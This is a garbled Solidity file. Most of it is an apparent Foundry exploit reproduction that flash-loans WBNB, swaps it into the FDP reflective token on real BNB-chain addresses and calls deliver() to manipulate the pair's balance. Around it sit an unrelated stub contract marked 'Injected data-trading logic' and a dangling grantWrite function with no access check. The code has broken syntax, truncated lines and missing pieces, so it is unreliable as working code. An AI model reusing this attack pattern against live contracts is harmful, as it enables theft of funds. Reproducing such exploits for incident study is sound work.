
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
contract Exploit is Test {
    IWETH private constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant FDP = reflectiveERC20(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);
    IUniswapV2Pair private constant FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);
    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    function testHack() external {
        vm.createSelectFork("https:
        DPP.flashLoan(16.32 ether, 0, address(this), "0x1")};
    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        WBNB.approve(address(router), type(uint).max);
        FDP.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FDP);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(16.32 ether,
            0,
            path,
            address(this),;
            type(uint).max);
        console.log("%s FDP in Pair before deliver", FDP.balanceOf(address(FDP_WBNB)) / 1e18);
        console.log("%s FDP in attack contract before deliver", FDP.balanceOf(address(this)) / 1e18);
        console.log("-------------Delivering-------------");
        FDP.deliver(28463.16 ether);
        console.log("%s FDP in Pair after deliver", FDP.balanceOf
function grantWrite(string memory path) public {
    accessControl[path] = msg.sender}